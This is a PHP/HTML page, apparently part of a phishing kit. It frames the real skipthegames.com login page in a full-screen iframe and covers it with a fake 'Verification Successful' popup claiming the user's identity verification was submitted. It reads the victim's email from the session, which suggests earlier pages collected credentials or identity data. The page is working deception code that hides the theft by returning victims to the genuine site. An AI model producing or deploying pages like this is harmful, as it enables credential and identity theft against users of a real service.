  <?php
  // verification_success.php
  // Muestra un popup de éxito sobre la página de login real.

  session_start();
  // Recuperar el correo de la sesión (solo para mantener la coherencia si es necesario)
  $user_email = $_SESSION['logged_in_email'] ?? 'email@example.com'; 
  ?>
  <!doctype html>
  <html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Verification Success</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
    
    <style>
      /* Estilos Generales para el Popup y el Contenedor */
      body, html {
        margin: 0;
        padding: 0;
        height: 100%;
        overflow: hidden; /* Oculta barras de desplazamiento innecesarias */
        font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
      }
      
      /* Contenedor del Iframe */
      #iframe-container {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
      }
      
      /* Estilo del Iframe */
      #login-iframe {
        width: 100%;
        height: 100%;
        border: none;
      }

      /* ===== MODAL/POPUP ESTILOS ===== */
      .modal {
        position: fixed;
        inset: 0;
        display: flex;
        align-items: center;
        justify-content: center;
        padding: 24px;
        background: rgba(0, 0, 0, 0.7); /* Fondo oscuro transparente */
        z-index: 1000;
        visibility: visible; /* Mostrar por defecto */
        opacity: 1;
        transition: opacity .3s ease;
      }
      
      .modal-card {
        width: min(400px, 90%);
        background: #ffffff;
        border-radius: 12px;
        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.25);
        padding: 30px;
        text-align: center;
      }
      
      .modal-title {
        margin-top: 0;
        font-size: 24px;
        font-weight: 700;
        color: #16a34a; /* Green success color */
      }
      
      .modal-message {
        font-size: 16px;
        color: #333;
        margin-bottom: 25px;
      }
      
      .modal-btn {
        width: 100%;
        height: 48px;
        border: 0;
        border-radius: 6px;
        background: #16a34a; /* Green success color */
        color: #fff;
        font-size: 16px;
        font-weight: 600;
        cursor: pointer;
        transition: background .15s ease;
      }
      .modal-btn:hover {
        background: #15803d;
      }
    </style>
  </head>
  <body>

    <div id="iframe-container">
      <iframe id="login-iframe" src="https://skipthegames.com/auth/login" title="Skipthegames Login"></iframe>
    </div>

    <div class="modal" id="successModal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
      <div class="modal-card">
        <h2 id="modalTitle" class="modal-title">✅ Verification Successful</h2>
        
        <p class="modal-message">
          Thank you! Your identity verification has been successfully submitted for review. 
          You can now continue to log in.
        </p>
        
        <button id="finishButton" class="modal-btn" type="button">FINISH</button>
      </div>
    </div>

    <script>
      const modal = document.getElementById('successModal');
      const finishButton = document.getElementById('finishButton');

      // Función para cerrar el modal
      function closeModal() {
        modal.style.opacity = 0;
        setTimeout(() => {
          modal.style.visibility = 'hidden';
        }, 300);
      }

      // Event listener para el botón FINISH
      finishButton.addEventListener('click', () => {
        closeModal();
        // Opcional: enfocar el iframe de login después de cerrar el modal
        // document.getElementById('login-iframe').focus(); 
      });
      
      // Opcional: Cerrar el modal al presionar ESC
      document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape') {
          closeModal();
        }
      });

    </script>
  </body>
  </html>